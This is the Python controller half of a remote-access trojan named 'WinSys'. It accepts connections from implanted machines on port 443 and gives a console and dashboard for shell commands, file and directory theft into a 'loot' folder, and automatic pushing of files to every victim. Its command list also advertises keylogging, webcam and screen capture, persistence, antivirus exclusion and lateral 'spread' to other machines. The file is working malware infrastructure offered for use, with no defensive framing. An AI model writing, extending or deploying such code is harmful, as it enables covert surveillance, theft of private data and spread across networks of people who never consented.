#!/usr/bin/env python3
"""
=========================================================================
  WinSys — CONTROLLER  (runs on YOUR machine)
=========================================================================
  drop/  -> pushed to every machine's inbox
  loot/  -> pulled from every machine's collect/
  dashboard: http://localhost:8080
=========================================================================
"""
import socket, os, json, threading, time
import dashboard

LISTEN_IP, LISTEN_PORT = "0.0.0.0", 443
WEB_PORT  = 8080
WEB_USER  = "admin"
WEB_PASS  = "winsys"        # "" disables auth
DROP = os.path.join(os.getcwd(), "drop")
LOOT = os.path.join(os.getcwd(), "loot")

clients, lock = {}, threading.Lock()


# ------------------------------ wire ------------------------------
def send_data(sock, d):
    if isinstance(d, str):
        d = d.encode("utf-8", "replace")
    sock.sendall(len(d).to_bytes(8, "big") + d)


def recvall(sock, n):
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            return None
        buf += c
    return buf


def recv_data(sock):
    h = recvall(sock, 8)
    if not h:
        return None
    n = int.from_bytes(h, "big")
    return b"" if n == 0 else recvall(sock, n)


HELP = """
  list / use <n> / all <cmd>     target management
  ls cd pwd mkdir rm             filesystem
  get <remote> / put <local>     single file
  getdir <remote> [local]        recursive download
  putdir <local> [remote]        recursive upload
  screenshot [primary|all|<n>]   capture a monitor
  monitors                       list their displays
  webcam [n]                     camera capture
  keylog start|stop|dump|clear   keystrokes
  ps / kill <pid> / sh <cmd> / sys
  power <shutdown|restart|sleep|hibernate|logoff|lock>
  persist / unpersist / exclude
  lan / spread / spreadall       lateral movement
  l <cmd> / exit
"""


def register(conn, addr):
    try:
        conn.settimeout(10)
        hello = json.loads(recv_data(conn))
        conn.settimeout(None)
    except Exception:
        conn.close(); return
    cid = "%s@%s" % (hello.get("user", "?"), hello.get("host", "?"))
    with lock:
        clients[cid] = {"sock": conn, "addr": addr, "hello": hello,
                        "cwd": hello.get("cwd", ""), "lock": threading.Lock()}
    print("\n[+] %s connected (%s)" % (cid, hello.get("os", "?")))


def accept_loop(srv):
    while True:
        try:
            conn, addr = srv.accept()
        except OSError:
            break
        threading.Thread(target=register, args=(conn, addr), daemon=True).start()


def snap():
    with lock:
        return sorted(clients.keys())


def talk(cl, cmd):
    with cl["lock"]:
        try:
            send_data(cl["sock"], cmd)
            r = json.loads(recv_data(cl["sock"]))
            cl["cwd"] = r.get("cwd", cl["cwd"])
            return r.get("out", "")
        except Exception as e:
            return "[-] link error: %s" % e


def fetch(cl, cmd):
    with cl["lock"]:
        try:
            send_data(cl["sock"], cmd)
            h = json.loads(recv_data(cl["sock"]))
            if h.get("status") != "file":
                return None, h.get("msg", "?")
            return h["name"], recv_data(cl["sock"])
        except Exception as e:
            return None, str(e)


def push_to(cl, local_path, remote_path):
    with cl["lock"]:
        try:
            send_data(cl["sock"], "put " + remote_path)
            if json.loads(recv_data(cl["sock"])).get("status") != "ready":
                return False
            send_data(cl["sock"], open(local_path, "rb").read())
            recv_data(cl["sock"])
            return True
        except Exception:
            return False


def getdir(cl, remote, local):
    try:
        meta = json.loads(talk(cl, "tree " + remote))
    except Exception:
        return "bad tree reply"
    if "error" in meta:
        return meta["error"]
    items = meta["items"]
    print("  %d files, %.1f MB" % (len(items), sum(i["size"] for i in items) / 1048576))
    ok = fail = 0
    for i, it in enumerate(items, 1):
        src = meta["root"].replace("\\", "/").rstrip("/") + "/" + it["rel"]
        n, blob = fetch(cl, "get " + src)
        if n is None:
            fail += 1; continue
        dest = os.path.join(local, it["rel"].replace("/", os.sep))
        os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
        open(dest, "wb").write(blob)
        ok += 1
        if i % 25 == 0 or i == len(items):
            print("  %d/%d" % (i, len(items)))
    return "downloaded %d files (%d failed) -> %s" % (ok, fail, local)


def putdir(cl, local, remote):
    sent = 0
    for dp, _dn, fn in os.walk(local):
        rel = os.path.relpath(dp, local)
        rdir = remote if rel == "." else remote.rstrip("/") + "/" + rel.replace(os.sep, "/")
        talk(cl, "mkdir " + rdir)
        for f in fn:
            if push_to(cl, os.path.join(dp, f), rdir.rstrip("/") + "/" + f):
                sent += 1
    return "uploaded %d files -> %s" % (sent, remote)


def sync_loop():
    os.makedirs(DROP, exist_ok=True); os.makedirs(LOOT, exist_ok=True)
    seen_drop, seen_loot = set(), set()
    while True:
        time.sleep(5)
        for f in os.listdir(DROP):
            if f not in seen_drop and os.path.isfile(os.path.join(DROP, f)):
                seen_drop.add(f)
                for cid in snap():
                    cl = clients[cid]
                    push_to(cl, os.path.join(DROP, f),
                            cl["hello"].get("inbox", ".").replace("\\", "/") + "/" + f)
                print("\n[drop] pushed %s to %d machine(s)" % (f, len(snap())))
        for cid in snap():
            cl = clients[cid]
            for line in talk(cl, "collect").splitlines():
                if "\t" not in line:
                    continue
                name = line.split("\t")[0]
                if (cid, name) not in seen_loot:
                    seen_loot.add((cid, name))
                    n, data = fetch(cl, "pick " + name)
                    if n and data is not None:
                        open(os.path.join(LOOT, cid + "_" + name), "wb").write(data)
                        print("\n[loot] pulled %s from %s" % (name, cid))


def target(arg):
    ids = snap()
    if not ids:
        print("no machines"); return None
    if arg.isdigit() and int(arg) < len(ids):
        return ids[int(arg)]
    if arg in clients:
        return arg
    for c in ids:
        if c.endswith("@" + arg) or c.startswith(arg + "@"):
            return c
    print("no match:", arg); return None


def main():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_IP, LISTEN_PORT)); srv.listen(64)
    print("[*] listening %s:%d  |  dashboard http://localhost:%d (%s/%s)"
          % (LISTEN_IP, LISTEN_PORT, WEB_PORT, WEB_USER, WEB_PASS or "no-auth"))
    print(HELP)
    threading.Thread(target=accept_loop, args=(srv,), daemon=True).start()
    threading.Thread(target=sync_loop, daemon=True).start()
    dashboard.start(clients, lock, talk, fetch, snap,
                    port=WEB_PORT, user=WEB_USER, password=WEB_PASS)

    current = None
    while True:
        try:
            line = input("%s> " % current if current else "no target> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            continue
        cmd, _, arg = line.partition(" ")
        cmd = cmd.lower()

        if cmd in ("exit", "quit"):
            break
        if cmd == "help":
            print(HELP); continue
        if cmd == "l":
            os.system(arg); continue
        if cmd == "list":
            for i, c in enumerate(snap()):
                print("%s %2d  %s  %s" % ("*" if c == current else " ", i, c,
                                          clients[c]["hello"].get("os", "")))
            continue
        if cmd == "use":
            current = target(arg); print("-> %s" % (current or "(none)")); continue
        if cmd == "all":
            for c in snap():
                print("== %s ==\n%s" % (c, talk(clients[c], arg)))
            continue

        if not current or current not in clients:
            print("no target (use 'list' then 'use <n>')"); continue
        cl = clients[current]

        if cmd in ("get", "screenshot", "webcam", "pick"):
            n, data = fetch(cl, line)
            if n and data is not None:
                open(n, "wb").write(data)
                print("saved %s (%d bytes)" % (n, len(data)))
            else:
                print("ERR:", data)
        elif cmd == "put":
            lp, _, rp = arg.partition(" ")
            if not os.path.isfile(lp):
                print("no such local file:", lp); continue
            print("OK" if push_to(cl, lp, rp or os.path.basename(lp)) else "failed")
        elif cmd == "getdir":
            rd, _, ld = arg.partition(" ")
            print(getdir(cl, rd, ld or os.path.basename(rd.rstrip("/\\")) or "loot_dir"))
        elif cmd == "putdir":
            ld, _, rd = arg.partition(" ")
            if not os.path.isdir(ld):
                print("no such local dir:", ld); continue
            print(putdir(cl, ld, rd or os.path.basename(ld.rstrip("/\\"))))
        else:
            print(talk(cl, line))


if __name__ == "__main__":
    main()